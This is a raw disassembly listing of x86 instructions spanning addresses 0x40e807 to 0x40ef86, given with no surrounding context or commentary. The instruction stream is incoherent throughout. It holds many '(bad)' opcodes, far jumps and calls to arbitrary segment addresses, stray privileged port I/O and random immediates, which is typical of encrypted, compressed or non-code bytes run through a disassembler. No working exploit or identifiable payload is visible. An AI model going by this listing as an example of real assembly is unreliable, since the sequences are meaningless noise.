  40e807:	paddusw mm2,mm2
  40e80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e80b:	mov    cl,0x77
  40e80d:	inc    ebp
  40e80e:	or     DWORD PTR es:[esi],0x57
  40e812:	or     bl,BYTE PTR [edx+0x6a]
  40e815:	adc    BYTE PTR [eax-0x51987644],dl
  40e81b:	ficomp DWORD PTR [edi+0x65]
  40e81e:	dec    esp
  40e81f:	inc    ebp
  40e820:	jp     0x40e7f8
  40e822:	jne    0x40e832
  40e824:	jmp    0x808c884c
  40e829:	cmp    dl,BYTE PTR ds:0xafdc9bef
  40e82f:	call   0x164609c3
  40e834:	pop    es
  40e835:	mov    ds:0x5299c87c,al
  40e83a:	test   DWORD PTR [ebx+0x506c0b65],edi
  40e840:	push   ebp
  40e841:	jnp    0x40e85c
  40e843:	xor    al,0x7d
  40e845:	imul   edi,DWORD PTR [ecx-0x52720b11],0xfffffffb
  40e84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e84d:	push   ebp
  40e84e:	mov    edx,0x3b26fe01
  40e853:	or     al,0x83
  40e855:	mov    al,ds:0xfc48e899
  40e85a:	das    
  40e85b:	imul   eax,DWORD PTR ds:0xdc428e0f,0xab4c4779
  40e865:	cld    
  40e866:	push   ss
  40e867:	es pusha 
  40e869:	enter  0xa622,0xb6
  40e86d:	jmp    0xee3f:0x711067d4
  40e874:	or     ecx,ebp
  40e876:	jecxz  0x40e828
  40e878:	adc    ebx,esi
  40e87a:	cdq    
  40e87b:	sbb    eax,0xacdd6e
  40e880:	ror    BYTE PTR [ebp+0x539028fa],0xba
  40e887:	push   eax
  40e888:	fdiv   DWORD PTR [bp+si+0x100f]
  40e88d:	add    esp,eax
  40e88f:	dec    ebp
  40e890:	test   BYTE PTR [esi+0x65],cl
  40e893:	(bad)  
  40e894:	and    ebx,esp
  40e896:	call   0x9105:0xdd8dc436
  40e89d:	push   cs
  40e89e:	xor    ah,BYTE PTR [ecx+0x1f108352]
  40e8a4:	sbb    ebx,DWORD PTR [ebp+0x1f]
  40e8a7:	mov    ebx,0xd06ccad8
  40e8ac:	mov    bh,0x64
  40e8ae:	shl    DWORD PTR [edi*8+0x6b80b2fe],0xae
  40e8b6:	mov    esi,0xb28a5d70
  40e8bb:	dec    edi
  40e8bc:	adc    DWORD PTR [edx+0x4f],edx
  40e8bf:	sub    DWORD PTR [esi+0x2b00c877],eax
  40e8c5:	and    BYTE PTR [eax-0x38],ch
  40e8c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8c9:	call   0x50a35702
  40e8ce:	outs   dx,DWORD PTR ds:[esi]
  40e8cf:	push   cs
  40e8d0:	nop
  40e8d1:	xor    eax,0x63167b77
  40e8d6:	push   edi
  40e8d7:	es jns 0x40e894
  40e8da:	mov    ecx,DWORD PTR [ecx]
  40e8dc:	(bad)  
  40e8dd:	cmp    bl,ah
  40e8df:	data16 jge 0x40e8ad
  40e8e2:	jne    0x40e8ad
  40e8e4:	sub    al,0x60
  40e8e6:	adc    al,0x43
  40e8e8:	jnp    0x40e91f
  40e8ea:	loopne 0x40e88e
  40e8ec:	addr16 mov eax,0xb2edd9d7
  40e8f2:	out    0xe0,al
  40e8f4:	outs   dx,DWORD PTR ds:[esi]
  40e8f5:	cli    
  40e8f6:	cmp    BYTE PTR [edx-0x1e],dl
  40e8f9:	das    
  40e8fa:	pop    esp
  40e8fb:	fstp   DWORD PTR ds:0x32dea2fe
  40e901:	adc    cl,ch
  40e903:	fucomp st(3)
  40e905:	in     eax,0xe8
  40e907:	sti    
  40e908:	loope  0x40e91d
  40e90a:	inc    esp
  40e90b:	dec    esp
  40e90c:	sbb    BYTE PTR [ebp+0x44ba0b1e],0x0
  40e913:	popa   
  40e914:	mov    al,0xac
  40e916:	ss inc ebx
  40e918:	mov    cl,al
  40e91a:	xor    DWORD PTR [eax],edi
  40e91c:	ror    bl,1
  40e91e:	jbe    0x40e8c5
  40e920:	in     al,dx
  40e921:	rol    eax,1
  40e923:	in     eax,0xf8
  40e925:	push   esi
  40e926:	pushf  
  40e927:	xchg   edx,eax
  40e928:	call   ebx
  40e92a:	dec    edx
  40e92b:	sub    esi,DWORD PTR [edi-0x40]
  40e92e:	lods   eax,DWORD PTR ds:[esi]
  40e92f:	and    DWORD PTR [edx+esi*8+0x18c78f94],edx
  40e936:	daa    
  40e937:	rcl    BYTE PTR [edx],1
  40e939:	ficom  WORD PTR [esi-0x56b57a15]
  40e93f:	sbb    eax,0xe802d0c9
  40e944:	inc    esi
  40e945:	mov    DWORD PTR [eax],edi
  40e947:	test   al,0x39
  40e949:	(bad)  
  40e94a:	pop    esi
  40e94b:	enter  0x7221,0xba
  40e94f:	and    eax,0x398777a
  40e954:	inc    ecx
  40e955:	es or  al,bh
  40e958:	sbb    al,bh
  40e95a:	cs cmp eax,0x41c7f76d
  40e960:	test   DWORD PTR [edx-0x4e5fa897],0x7cd239bb
  40e96a:	push   edx
  40e96b:	xlat   BYTE PTR ds:[ebx]
  40e96c:	pop    ss
  40e96d:	sub    DWORD PTR [eax+0x569d63c4],edi
  40e973:	adc    eax,0xe7d9ea6b
  40e978:	or     eax,0x1bee31a5
  40e97d:	(bad)  
  40e97e:	pop    ss
  40e97f:	ins    BYTE PTR es:[edi],dx
  40e980:	pusha  
  40e981:	jmp    0x40e98b
  40e983:	stos   DWORD PTR es:[edi],eax
  40e984:	adc    DWORD PTR [eax+0x74],ebx
  40e987:	inc    edx
  40e988:	xchg   esi,eax
  40e989:	mov    esi,0x99c8b989
  40e98e:	inc    edi
  40e98f:	loop   0x40e97d
  40e991:	loope  0x40e978
  40e993:	loopne 0x40e9d0
  40e995:	adc    ecx,edx
  40e997:	mov    ch,0xaa
  40e999:	aaa    
  40e99a:	mov    ah,BYTE PTR [ecx-0x74]
  40e99d:	inc    esi
  40e99e:	and    ebp,DWORD PTR [eax]
  40e9a0:	shl    BYTE PTR [esi+ecx*4+0x78],0x40
  40e9a5:	ins    BYTE PTR es:[edi],dx
  40e9a6:	xor    edi,eax
  40e9a8:	inc    ebp
  40e9a9:	stos   BYTE PTR es:[edi],al
  40e9aa:	pop    edx
  40e9ab:	cmp    ecx,DWORD PTR [esi]
  40e9ad:	addr16 std 
  40e9af:	or     al,0xd6
  40e9b1:	ret    
  40e9b2:	mov    ch,0xec
  40e9b4:	cmp    ebx,ecx
  40e9b6:	cmp    dl,BYTE PTR [esi-0x14d6c36e]
  40e9bc:	push   0x2db6afa3
  40e9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9c2:	mov    edx,0x524b7438
  40e9c7:	ds mov eax,0xcb13718
  40e9cd:	repnz cld 
  40e9cf:	fdivrp st(7),st
  40e9d1:	rcr    ch,1
  40e9d3:	jns    0x40e9ec
  40e9d5:	pop    es
  40e9d6:	push   0x35
  40e9d8:	or     eax,0xa346b6d1
  40e9dd:	cwde   
  40e9de:	push   0xffffffc0
  40e9e0:	xchg   edx,eax
  40e9e1:	jl     0x40e979
  40e9e3:	std    
  40e9e4:	enter  0xae20,0xda
  40e9e8:	sbb    DWORD PTR [eax+edi*8],ebx
  40e9eb:	in     al,0xbd
  40e9ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ee:	adc    bl,BYTE PTR [ebp+0xd]
  40e9f1:	sub    al,BYTE PTR [esi+0x4321723b]
  40e9f7:	addr16 mov ds:0x1860,eax
  40e9fb:	mov    ch,0xe
  40e9fd:	and    eax,0x22413188
  40ea02:	mov    ebp,0xffea9683
  40ea07:	inc    edi
  40ea08:	cmp    DWORD PTR [ebp+0x5fbb58f6],esi
  40ea0e:	xor    dh,BYTE PTR [ecx]
  40ea10:	push   gs
  40ea12:	cmp    BYTE PTR [esi-0x58c1c173],bh
  40ea18:	mov    dl,0xce
  40ea1a:	in     eax,dx
  40ea1b:	add    DWORD PTR [edx+ebp*8+0x1ee54211],ecx
  40ea22:	mov    dl,0x6c
  40ea24:	fisttp DWORD PTR [eax+0x8113321]
  40ea2a:	loopne 0x40e9b3
  40ea2c:	retf   0xe97b
  40ea2f:	call   0xd717f8ec
  40ea34:	add    edi,DWORD PTR [ebx]
  40ea36:	xchg   ecx,eax
  40ea37:	cmp    ebp,edx
  40ea39:	push   ss
  40ea3a:	sub    al,0xbb
  40ea3c:	dec    eax
  40ea3d:	daa    
  40ea3e:	daa    
  40ea3f:	shl    bh,0x35
  40ea42:	inc    ebx
  40ea43:	xor    cl,bh
  40ea45:	dec    ebp
  40ea46:	loop   0x40e9cc
  40ea48:	jns    0x40ea56
  40ea4a:	mov    esi,0x1c225b4b
  40ea4f:	out    0x16,eax
  40ea51:	adc    esi,ecx
  40ea53:	pop    esi
  40ea54:	adc    DWORD PTR [eax],eax
  40ea56:	arpl   WORD PTR [eax],si
  40ea58:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ea5a:	daa    
  40ea5b:	ficomp WORD PTR [ebp+0x26a4a4e9]
  40ea61:	cli    
  40ea62:	cmp    eax,esp
  40ea64:	aas    
  40ea65:	inc    edi
  40ea66:	iret   
  40ea67:	scas   al,BYTE PTR es:[edi]
  40ea68:	pop    eax
  40ea69:	adc    bl,bl
  40ea6b:	fcmovnb st,st(7)
  40ea6d:	pusha  
  40ea6e:	nop
  40ea6f:	sbb    eax,0x51201601
  40ea74:	inc    edi
  40ea75:	push   ss
  40ea76:	(bad)  
  40ea77:	sti    
  40ea78:	dec    ebx
  40ea79:	pop    ebp
  40ea7a:	dec    esp
  40ea7b:	jecxz  0x40ea30
  40ea7d:	xor    al,0x32
  40ea7f:	cmp    al,0x34
  40ea81:	mov    cl,0x21
  40ea83:	dec    ecx
  40ea84:	stc    
  40ea85:	enter  0x649f,0xbf
  40ea89:	sbb    dl,ch
  40ea8b:	cwde   
  40ea8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea8d:	lods   eax,DWORD PTR ds:[esi]
  40ea8e:	sahf   
  40ea8f:	sub    edi,esi
  40ea91:	stos   BYTE PTR es:[edi],al
  40ea92:	sbb    eax,0x789b0bd8
  40ea97:	mov    ebx,0x188870ef
  40ea9c:	pop    ebp
  40ea9d:	sbb    eax,0x32afe55f
  40eaa2:	xchg   ebp,eax
  40eaa3:	xchg   ecx,eax
  40eaa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaa5:	adc    BYTE PTR [ecx-0x6582fd9e],ah
  40eaab:	push   ebx
  40eaac:	or     al,0x6c
  40eaae:	inc    ecx
  40eaaf:	jbe    0x40ea55
  40eab1:	jmp    0x7cc1:0xcf69ac72
  40eab8:	pop    esi
  40eab9:	stos   BYTE PTR es:[edi],al
  40eaba:	adc    DWORD PTR [edi],0x6a82a13
  40eac0:	repz lahf 
  40eac2:	cmp    ebx,DWORD PTR [edx]
  40eac4:	pop    esp
  40eac5:	fs inc ebx
  40eac7:	and    ah,BYTE PTR [edx-0x4c]
  40eaca:	into   
  40eacb:	dec    eax
  40eacc:	and    BYTE PTR [ecx],bh
  40eace:	stos   BYTE PTR es:[edi],al
  40eacf:	pusha  
  40ead0:	popf   
  40ead1:	lock ret 
  40ead3:	mov    edi,DWORD PTR ds:0x9dd50737
  40ead9:	daa    
  40eada:	call   0xf09e:0x9dd76b39
  40eae1:	mov    eax,esi
  40eae3:	mov    ebp,0x1244a07e
  40eae8:	aaa    
  40eae9:	jecxz  0x40ea95
  40eaeb:	or     al,0x63
  40eaed:	stos   DWORD PTR es:[edi],eax
  40eaee:	popf   
  40eaef:	fwait
  40eaf0:	jb     0x40eb21
  40eaf2:	mov    edx,0x762b10c1
  40eaf7:	inc    DWORD PTR [edx+eiz*1+0x3]
  40eafb:	out    dx,al
  40eafc:	jnp    0x40eb7b
  40eafe:	add    eax,0x9798e054
  40eb03:	aad    0x59
  40eb05:	or     ah,BYTE PTR [ebp-0x13be5c5f]
  40eb0b:	sbb    BYTE PTR [edx-0x12],cl
  40eb0e:	push   0x6b
  40eb10:	mov    ecx,0xa024bafc
  40eb15:	mov    ecx,0x6026466f
  40eb1a:	scas   eax,DWORD PTR es:[edi]
  40eb1b:	xor    eax,0xd7de6e4c
  40eb20:	pop    es
  40eb21:	or     eax,0x103020bb
  40eb26:	or     bl,BYTE PTR ds:0x81ebba3f
  40eb2c:	adc    al,0xbc
  40eb2e:	jg     0x40eb3c
  40eb30:	xchg   edx,eax
  40eb31:	into   
  40eb32:	cld    
  40eb33:	pushf  
  40eb34:	push   edi
  40eb35:	push   eax
  40eb36:	add    ebx,eax
  40eb38:	jns    0x40eb41
  40eb3a:	stos   BYTE PTR es:[edi],al
  40eb3b:	mov    ds:0xb50b72dc,al
  40eb40:	and    eax,DWORD PTR [ebp-0x26f13a69]
  40eb46:	mov    ds:0xe40291a5,eax
  40eb4b:	xor    eax,0xc86917f0
  40eb50:	xlat   BYTE PTR ds:[ebx]
  40eb51:	xchg   ebp,eax
  40eb52:	es xchg edx,eax
  40eb54:	outs   dx,BYTE PTR ds:[esi]
  40eb55:	inc    edx
  40eb56:	pop    es
  40eb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb58:	pop    ebx
  40eb59:	pop    edx
  40eb5a:	sub    ch,BYTE PTR [ebx]
  40eb5c:	sub    BYTE PTR [eax+0x1c597f2a],0xa4
  40eb63:	fstp   QWORD PTR [ebp-0x5f]
  40eb66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb67:	adc    al,0xf
  40eb69:	dec    ebx
  40eb6a:	retf   
  40eb6b:	gs ins DWORD PTR es:[edi],dx
  40eb6d:	test   al,0x3e
  40eb6f:	and    BYTE PTR [esi+0x26184a0c],0xc2
  40eb76:	in     eax,dx
  40eb77:	sbb    eax,0x8591d46b
  40eb7c:	push   eax
  40eb7d:	pop    esp
  40eb7e:	mov    dl,dl
  40eb80:	stc    
  40eb81:	stos   BYTE PTR es:[edi],al
  40eb82:	xor    al,0x6e
  40eb84:	popa   
  40eb85:	(bad)  
  40eb86:	adc    ecx,DWORD PTR [esi+eax*8-0x38]
  40eb8a:	fstp   DWORD PTR [edi-0x76f54a1c]
  40eb90:	xor    al,0xf3
  40eb92:	ret    
  40eb93:	cwde   
  40eb94:	adc    ecx,DWORD PTR [eax+0x39feaf07]
  40eb9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb9b:	sbb    dl,BYTE PTR ds:0xa48addf3
  40eba1:	in     eax,0x52
  40eba3:	aaa    
  40eba4:	pop    edx
  40eba5:	out    dx,al
  40eba6:	lods   al,BYTE PTR ds:[esi]
  40eba7:	in     eax,0x28
  40eba9:	inc    ecx
  40ebaa:	jp     0x40ebd7
  40ebac:	lods   al,BYTE PTR ds:[esi]
  40ebad:	cmp    DWORD PTR [edi-0x12],esi
  40ebb0:	lods   al,BYTE PTR ds:[esi]
  40ebb1:	out    dx,eax
  40ebb2:	cmp    BYTE PTR ds:0xddfe30cf,bh
  40ebb8:	js     0x40ebfd
  40ebba:	sub    BYTE PTR [ebx+eiz*1],bh
  40ebbd:	out    dx,eax
  40ebbe:	fld    st(5)
  40ebc0:	iret   
  40ebc1:	ss sbb eax,0xf27a9274
  40ebc7:	leave  
  40ebc8:	xchg   edx,eax
  40ebc9:	mov    al,0x6c
  40ebcb:	out    dx,eax
  40ebcc:	sqrtps xmm2,XMMWORD PTR [edx-0x77f69190]
  40ebd3:	int3   
  40ebd4:	mov    fs,edx
  40ebd6:	and    eax,0xd06bf24c
  40ebdb:	or     BYTE PTR [ecx+eax*1-0x6],al
  40ebdf:	mov    ah,0xa5
  40ebe1:	jmp    0x66428c16
  40ebe6:	lea    esi,[ebp+0x5b]
  40ebe9:	push   ecx
  40ebea:	dec    eax
  40ebeb:	add    al,0xeb
  40ebed:	or     BYTE PTR [edi+0x11],0x6d
  40ebf1:	lahf   
  40ebf2:	cli    
  40ebf3:	and    BYTE PTR [ebx-0x2947d25c],al
  40ebf9:	add    al,0x6
  40ebfb:	mov    dl,0xf6
  40ebfd:	std    
  40ebfe:	dec    ebp
  40ebff:	ins    DWORD PTR es:[edi],dx
  40ec00:	push   ebp
  40ec01:	mov    eax,es
  40ec03:	mov    dh,0x7
  40ec05:	shr    DWORD PTR [esi-0x6c163d14],1
  40ec0b:	pop    ebx
  40ec0c:	mov    ah,0x77
  40ec0e:	outs   dx,BYTE PTR ds:[esi]
  40ec0f:	pinsrw mm0,WORD PTR [edx-0x1b],0x78
  40ec14:	ss test eax,0x7b8201db
  40ec1a:	sbb    eax,0xdf655820
  40ec1f:	ds push 0xffffff9c
  40ec22:	cmp    BYTE PTR [ebx+ebx*8],dh
  40ec25:	lods   eax,DWORD PTR ds:[esi]
  40ec26:	popf   
  40ec27:	sbb    al,0x17
  40ec29:	dec    ecx
  40ec2a:	ss dec edi
  40ec2c:	lock dec eax
  40ec2e:	cdq    
  40ec2f:	nop
  40ec30:	hlt    
  40ec31:	sub    dh,ch
  40ec33:	cmp    ebx,DWORD PTR ds:0x750752b5
  40ec39:	fdivr  DWORD PTR es:[esi-0x70]
  40ec3d:	nop
  40ec3e:	pop    ebx
  40ec3f:	ins    BYTE PTR es:[edi],dx
  40ec40:	xchg   ecx,eax
  40ec41:	push   eax
  40ec42:	and    dl,ah
  40ec44:	xlat   BYTE PTR ds:[ebx]
  40ec45:	pushf  
  40ec46:	call   0x8a6b:0xc1a6bcde
  40ec4d:	ficomp WORD PTR [eax+0x2a30294]
  40ec53:	add    DWORD PTR [edi-0x4d],esp
  40ec56:	pop    ebx
  40ec57:	push   ebp
  40ec58:	fadd   QWORD PTR [eax+ecx*2+0x7ac2349d]
  40ec5f:	push   edx
  40ec60:	or     DWORD PTR [ebp+0x513c7e60],ebx
  40ec66:	mov    dh,0x2a
  40ec68:	sub    esi,DWORD PTR [edx]
  40ec6a:	ficom  DWORD PTR [ebp+0x5405fe9]
  40ec70:	mov    cl,0x62
  40ec72:	popw   ds
  40ec74:	fistp  DWORD PTR [eax-0x74]
  40ec77:	and    DWORD PTR [esi+0x2e605ed8],edx
  40ec7d:	in     al,0x3e
  40ec7f:	aaa    
  40ec80:	inc    ebp
  40ec81:	neg    BYTE PTR [eax]
  40ec83:	jbe    0x40ec92
  40ec85:	jnp    0x40eca9
  40ec87:	test   DWORD PTR [edi-0x7a286374],esi
  40ec8d:	xchg   esi,eax
  40ec8e:	and    al,0xf
  40ec90:	xor    al,0xb6
  40ec92:	es jmp 0x8991:0x6a587a3c
  40ec9a:	lahf   
  40ec9b:	clc    
  40ec9c:	jp     0x40ec78
  40ec9e:	jne    0x40ec2f
  40eca0:	pushf  
  40eca1:	mov    eax,0xe2dff63a
  40eca6:	sub    eax,0x290c84ee
  40ecab:	mov    ds:0x45dedac1,al
  40ecb0:	mov    edx,0xd461fb7d
  40ecb5:	add    BYTE PTR [esi+0x4e322d32],0x35
  40ecbc:	repnz (bad) 
  40ecbe:	cld    
  40ecbf:	jbe    0x40ecc5
  40ecc1:	dec    eax
  40ecc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc3:	push   ecx
  40ecc4:	and    eax,0xcd658012
  40ecc9:	sbb    al,0x1e
  40eccb:	(bad)  
  40eccc:	cmp    BYTE PTR [esi],ch
  40ecce:	aas    
  40eccf:	xchg   esp,eax
  40ecd0:	mov    ebp,0xe97a5a14
  40ecd5:	add    ebp,0xffffffe6
  40ecd8:	jle    0x40ed03
  40ecda:	xor    cl,BYTE PTR [ecx+edi*1+0x63ba629b]
  40ece1:	in     eax,dx
  40ece2:	outs   dx,DWORD PTR ds:[esi]
  40ece3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ece5:	pop    edi
  40ece6:	mov    cl,0xb0
  40ece8:	mov    edi,0xbd86a9e1
  40eced:	loop   0x40ecb0
  40ecef:	cs pop ss
  40ecf1:	xchg   BYTE PTR [edi],bl
  40ecf3:	xchg   ebp,eax
  40ecf4:	add    BYTE PTR [eax-0x355f56e4],bl
  40ecfa:	sbb    eax,0xffd6c0f1
  40ecff:	and    eax,0xb1547423
  40ed04:	jmp    0x40ed6e
  40ed06:	fcom   st(0)
  40ed08:	mov    DWORD PTR [edx-0x64],esp
  40ed0b:	jae    0x40ec9c
  40ed0d:	push   esi
  40ed0e:	mov    ds:0x5929d297,eax
  40ed13:	stc    
  40ed14:	push   ebp
  40ed15:	(bad)  
  40ed16:	out    dx,al
  40ed17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed18:	fxch   st(4)
  40ed1a:	add    esi,DWORD PTR [ebx-0x12]
  40ed1d:	fldenv [esi-0x304292b1]
  40ed23:	icebp  
  40ed24:	xor    dl,bh
  40ed26:	cdq    
  40ed27:	xchg   ecx,eax
  40ed28:	arpl   WORD PTR [edi],bp
  40ed2a:	loopne 0x40eda1
  40ed2c:	xchg   BYTE PTR [ecx],bl
  40ed2e:	(bad)  
  40ed2f:	mov    DWORD PTR [ebx],edx
  40ed31:	adc    BYTE PTR [eax+0x5],cl
  40ed34:	out    0x8e,eax
  40ed36:	scas   eax,DWORD PTR es:[edi]
  40ed37:	xor    DWORD PTR [ebp-0x1bea7615],0x6377c75d
  40ed41:	add    ah,ah
  40ed43:	dec    eax
  40ed44:	adc    al,0x9f
  40ed46:	call   0xd63caf8e
  40ed4b:	mov    al,0xfc
  40ed4d:	lahf   
  40ed4e:	clc    
  40ed4f:	lock in eax,dx
  40ed51:	adc    DWORD PTR [edi+0x66],edi
  40ed54:	sub    DWORD PTR [edx-0x7008c192],esi
  40ed5a:	(bad)  
  40ed5b:	ins    DWORD PTR es:[edi],dx
  40ed5c:	rol    al,1
  40ed5e:	adc    al,0x3e
  40ed60:	xchg   edi,eax
  40ed61:	inc    edi
  40ed62:	pop    esi
  40ed63:	out    0x6c,eax
  40ed65:	stc    
  40ed66:	mov    gs,WORD PTR [ecx-0x5d]
  40ed69:	mov    WORD PTR [eax-0x10],ds
  40ed6c:	repnz mov ebp,ecx
  40ed6f:	rcl    DWORD PTR [esp+edx*2],0x3
  40ed73:	out    0x77,eax
  40ed75:	(bad)  
  40ed76:	xor    ch,BYTE PTR [esi]
  40ed78:	jmp    0x6371029c
  40ed7d:	addr16 shl ebp,0xc5
  40ed81:	push   edx
  40ed82:	in     al,dx
  40ed83:	pop    ds
  40ed84:	ja     0x40ed46
  40ed86:	sahf   
  40ed87:	stos   BYTE PTR es:[edi],al
  40ed88:	inc    ebx
  40ed89:	ret    0x8fd3
  40ed8c:	push   ds
  40ed8d:	std    
  40ed8e:	mov    cl,0x2c
  40ed90:	adc    al,0x7e
  40ed92:	mov    ah,dl
  40ed94:	fist   WORD PTR [eax+0x73effd0a]
  40ed9a:	adc    eax,0x610a82a2
  40ed9f:	les    edi,FWORD PTR [ecx]
  40eda1:	push   0xc1515b58
  40eda6:	xchg   esi,eax
  40eda7:	xor    DWORD PTR [ecx+0x5ed2477],esi
  40edad:	aad    0xc6
  40edaf:	loopne 0x40ed56
  40edb1:	pushf  
  40edb2:	push   ss
  40edb3:	retf   
  40edb4:	les    ebp,FWORD PTR [ebp+0x29]
  40edb7:	xlat   BYTE PTR ds:[ebx]
  40edb8:	in     eax,0x1a
  40edba:	and    BYTE PTR [eax+0x7d],al
  40edbd:	shr    al,cl
  40edbf:	lock sar BYTE PTR [ebx],0x86
  40edc3:	and    bh,ah
  40edc5:	and    eax,0xa3bb86e4
  40edca:	jae    0x40ed86
  40edcc:	(bad)  
  40edce:	iret   
  40edcf:	or     ch,BYTE PTR [ebp-0x684c45f9]
  40edd5:	pushf  
  40edd6:	and    al,0x2e
  40edd8:	pop    eax
  40edd9:	inc    ebp
  40edda:	in     eax,0x73
  40eddc:	pop    esi
  40eddd:	and    DWORD PTR [ebp+0x66],0x68d51a2d
  40ede4:	aad    0xdc
  40ede6:	push   ds
  40ede7:	cmp    cl,bl
  40ede9:	test   eax,0x11a74fd
  40edee:	imul   ecx,ecx,0x42dc5c23
  40edf4:	adc    DWORD PTR [ebp-0x1d23f432],ebx
  40edfa:	mov    ?,WORD PTR [edx]
  40edfc:	push   es
  40edfd:	f2xm1  
  40edff:	mov    esp,0x80b712f5
  40ee04:	sti    
  40ee05:	popf   
  40ee06:	lock jl 0x40ed92
  40ee09:	clc    
  40ee0a:	jne    0x40edcf
  40ee0c:	out    dx,al
  40ee0d:	mov    ecx,0xc666484
  40ee12:	mov    DWORD PTR [edx-0x14272079],0xa832b458
  40ee1c:	repz xchg ebp,eax
  40ee1e:	call   0xc1343aa6
  40ee23:	mov    bl,0xe9
  40ee25:	xor    eax,0x48b89c97
  40ee2a:	mov    ds:0x68a6c84c,al
  40ee2f:	push   esi
  40ee30:	and    cl,bh
  40ee32:	ja     0x40edd4
  40ee34:	inc    ebp
  40ee35:	jne    0x40ee0e
  40ee37:	retf   0xd3c6
  40ee3a:	inc    ecx
  40ee3b:	push   eax
  40ee3c:	mov    BYTE PTR [edx+0x75],bh
  40ee3f:	pop    esi
  40ee40:	mov    dh,0xf9
  40ee42:	or     DWORD PTR [edi],esi
  40ee44:	sub    DWORD PTR [ecx+0x1b],0xffffffc5
  40ee48:	adc    DWORD PTR [edi],eax
  40ee4a:	(bad)  
  40ee4b:	es inc edx
  40ee4d:	sub    bl,0x25
  40ee50:	stos   BYTE PTR es:[edi],al
  40ee51:	enter  0x6d62,0x30
  40ee55:	cmp    eax,0x44a270f2
  40ee5a:	jmp    0x40ee7f
  40ee5c:	pop    ds
  40ee5d:	cwde   
  40ee5e:	mov    eax,0xc72ee336
  40ee63:	push   eax
  40ee64:	int    0x7d
  40ee66:	sub    al,0x91
  40ee68:	sbb    BYTE PTR [ecx+0x6043904b],0xd
  40ee6f:	xchg   esi,eax
  40ee70:	sbb    ebp,edi
  40ee72:	ja     0x40eed2
  40ee74:	mov    bh,0x81
  40ee76:	repnz repz test DWORD PTR [eax+0x1b],ebx
  40ee7b:	mov    esp,0x3af17d7
  40ee80:	fincstp 
  40ee82:	bound  esp,QWORD PTR [ebp+esi*8-0x74cc3b35]
  40ee89:	inc    ebp
  40ee8a:	cld    
  40ee8b:	call   0x95ba9e23
  40ee90:	adc    al,0x1f
  40ee92:	sbb    DWORD PTR [ebp+ebp*4-0x46],edx
  40ee96:	adc    DWORD PTR [edx+edi*8-0x47],esp
  40ee9a:	or     eax,0xead2eada
  40ee9f:	je     0x40ee99
  40eea1:	stc    
  40eea2:	stos   DWORD PTR es:[edi],eax
  40eea3:	enter  0xb31f,0xe5
  40eea7:	out    dx,eax
  40eea8:	jmp    0x40ee4f
  40eeaa:	add    ah,BYTE PTR [edi+0x3]
  40eead:	adc    eax,DWORD PTR [edi-0x1e81490e]
  40eeb3:	js     0x40ee41
  40eeb5:	int    0xdc
  40eeb7:	ret    0xd224
  40eeba:	sub    cl,BYTE PTR [esi+0x66]
  40eebd:	dec    ebx
  40eebe:	fst    QWORD PTR ss:[ebp-0x1d5fc534]
  40eec5:	(bad)  
  40eec6:	div    DWORD PTR [esp+eiz*4+0x5ae8f787]
  40eecd:	les    esi,FWORD PTR ds:0xeda96ae2
  40eed3:	les    edx,FWORD PTR [edx+0x6fd5de97]
  40eed9:	arpl   WORD PTR [esi],di
  40eedb:	or     al,0xfb
  40eedd:	fst    DWORD PTR [edi-0x592987d3]
  40eee3:	je     0x40eec7
  40eee5:	or     DWORD PTR [eax+0x35],esp
  40eee8:	imul   ebx,ebx,0x54
  40eeeb:	xchg   edi,eax
  40eeec:	xchg   ebp,eax
  40eeed:	sub    eax,0x35b233b4
  40eef2:	add    eax,0x9ce4fc8a
  40eef7:	sub    ebp,DWORD PTR [esi-0xa272050]
  40eefd:	sbb    eax,0x3fc5ee29
  40ef02:	fimul  WORD PTR [eax+0x36]
  40ef05:	loop   0x40ef66
  40ef07:	(bad)  
  40ef08:	push   ss
  40ef09:	xor    DWORD PTR [ebp+0x52],ebp
  40ef0c:	enter  0x5517,0xf6
  40ef10:	push   eax
  40ef11:	lods   eax,DWORD PTR ds:[esi]
  40ef12:	iret   
  40ef13:	test   BYTE PTR [ebx-0x4a],bh
  40ef16:	fmul   QWORD PTR [ebp+0x18]
  40ef19:	daa    
  40ef1a:	mov    al,ds:0x8a29a2e8
  40ef1f:	adc    eax,0x5d228f55
  40ef24:	gs mov esp,0x22186c86
  40ef2a:	mov    ecx,0x5e415505
  40ef2f:	repz out dx,al
  40ef31:	sbb    al,0x42
  40ef34:	dec    ebp
  40ef35:	push   edx
  40ef36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef37:	xchg   cl,cl
  40ef39:	retfw  0xc731
  40ef3d:	push   es
  40ef3e:	in     eax,0x4
  40ef40:	cs jb  0x40eeff
  40ef43:	shl    DWORD PTR [eax-0x1],0xfc
  40ef47:	test   BYTE PTR [ecx-0x22e5410b],bl
  40ef4d:	cmp    edx,ecx
  40ef4f:	ds cmc 
  40ef51:	xor    cl,BYTE PTR [eax+0x14]
  40ef54:	xchg   ecx,eax
  40ef55:	cld    
  40ef56:	and    bl,BYTE PTR [edi-0x5a628bab]
  40ef5c:	mov    dh,0xbd
  40ef5e:	int    0x39
  40ef60:	ror    BYTE PTR [eax+0x4],cl
  40ef63:	retf   0x2598
  40ef66:	js     0x40eef3
  40ef68:	(bad)
  40ef6b:	pop    edi
  40ef6c:	sbb    eax,0x833bb560
  40ef71:	mov    ds:0xbc432eae,al
  40ef76:	mov    bl,0xde
  40ef78:	xor    DWORD PTR [edx+0x3392926c],ebp
  40ef7e:	int3   
  40ef7f:	push   es
  40ef80:	xor    edx,eax
  40ef82:	lods   al,BYTE PTR ds:[esi]
  40ef83:	stc    
  40ef84:	mov    dl,0xda
  40ef86:	fnsave [ecx]
